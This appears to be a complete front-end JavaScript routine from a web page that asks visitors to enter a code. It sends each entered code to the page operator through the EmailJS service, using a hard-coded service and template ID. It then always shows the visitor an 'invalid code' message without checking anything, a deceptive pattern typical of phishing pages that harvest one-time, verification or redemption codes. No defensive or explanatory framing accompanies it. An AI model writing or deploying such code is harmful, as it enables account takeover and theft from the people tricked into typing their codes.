function sendEmail() {
    var params = {
        entercode : document.getElementById("entercode").value,
    }
    const serviceID = "service_golkri8" ;   
    const templateID = "template_kk0khzo";

   emailjs.send(serviceID, templateID, params)
   .then (
    res => {
        document.getElementById("entercode").value ="";
        console.log(res);
        document.getElementById("opps").innerHTML = "Opps You have entered an invalid code";
    })
    .catch((err) => console.log(err)); 
}
